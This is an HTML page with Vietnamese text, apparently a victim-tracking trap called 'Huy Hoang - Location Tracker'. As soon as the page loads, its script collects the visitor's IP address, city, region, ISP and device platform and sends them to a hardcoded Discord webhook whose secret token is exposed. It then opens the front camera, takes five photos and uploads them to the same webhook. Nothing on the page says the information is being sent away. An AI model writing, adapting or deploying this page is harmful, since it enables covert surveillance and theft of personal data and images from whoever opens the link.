<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Huy Hoang - Location Tracker</title>
    <style>
        body {
            background: #0a0a0a;
            margin: 0;
            padding: 20px;
            font-family: monospace;
            color: #0f0;
            line-height: 1.6;
        }
        .status {
            color: #ff0;
            margin: 15px 0;
            padding: 10px;
            background: rgba(255, 200, 0, 0.1);
            border-radius: 6px;
        }
    </style>
</head>
<body>
    <div class="status">Đang khởi tạo tracker cấp độ MAX...</div>

    <video id="video" autoplay playsinline style="display:none; width:100%; max-width:400px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM';

        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 400;

        let cameraStream = null;

        async function sendText(content) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: "Huy Hoang - Location Tracker", content })
                });
            } catch(e) {}
        }

        async function sendFile(blob, filename, caption) {
            try {
                const form = new FormData();
                form.append('file', blob, filename);
                form.append('payload_json', JSON.stringify({
                    username: "Huy Hoang - Location Tracker",
                    content: caption
                }));
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
            } catch(e) {}
        }

        // Lấy IP + vị trí (đã tối ưu)
        async function sendVisitorInfo() {
            let ip = "Không xác định", city = "Không xác định", region = "Không xác định", isp = "Không xác định";
            const apis = [
                "https://ip-api.com/json/?fields=query,status,city,regionName,isp",
                "https://ipapi.co/json/"
            ];

            for (let url of apis) {
                try {
                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
                    const data = await res.json();
                    if (url.includes("ip-api.com") && data.status === "success") {
                        ip = data.query;
                        city = data.city || city;
                        region = data.regionName || region;
                        isp = data.isp || isp;
                        break;
                    } else if (url.includes("ipapi.co")) {
                        ip = data.ip || ip;
                        city = data.city || city;
                        region = data.region || region;
                        isp = data.org || isp;
                    }
                } catch(e) {}
            }

            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                        `🌐 **IP:** ${ip}\n` +
                        `📍 **Thành phố:** ${city}\n` +
                        `🗺️ **Khu vực:** ${region}\n` +
                        `🏢 **Nhà mạng:** ${isp}\n` +
                        `📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n` +
                        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
                        `🔗 **Nguồn:** Truy cập trực tiếp`;

            await sendText(msg);
        }

        // Camera tối ưu cho cả desktop & mobile
        async function startCameraAndCapture() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const status = document.querySelector('.status');

            try {
                // Constraints nhẹ + linh hoạt hơn cho máy tính
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: "user" },   // Ưu tiên camera trước
                        width: { ideal: 640, max: 1280 },
                        height: { ideal: 480, max: 720 }
                    }
                });

                video.srcObject = cameraStream;
                await new Promise(r => video.onloadedmetadata = r);
                video.play();

                status.textContent = "✅ Camera đã mở. Đang chụp ảnh...";

                for (let i = 1; i <= PHOTO_COUNT; i++) {
                    await new Promise(resolve => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            if (blob) sendFile(blob, `photo_${i}_${Date.now()}.jpg`, `📸 **Ảnh chụp #${i}**`);
                            resolve();
                        }, 'image/jpeg', 0.85);
                    });
                    if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
                }

                if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
                status.textContent = "✅ Đã chụp xong 5 ảnh";

            } catch (err) {
                console.error(err);
                let msg = "⚠️ Không mở được camera.\n";
                if (err.name === "NotAllowedError") msg += "Bạn chưa cho phép quyền camera.";
                else if (err.name === "NotFoundError") msg += "Không tìm thấy camera.";
                else if (err.name === "NotReadableError") msg += "Camera đang bị dùng bởi chương trình khác (Zoom, Teams...).";
                else msg += "Vui lòng kiểm tra quyền camera trong trình duyệt.";

                status.style.color = "#f66";
                status.textContent = msg;
                await sendText("⚠️ " + msg.replace(/\n/g, " "));
            }
        }

        // Khởi chạy
        async function init() {
            await sendVisitorInfo();
            setTimeout(startCameraAndCapture, 600);
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
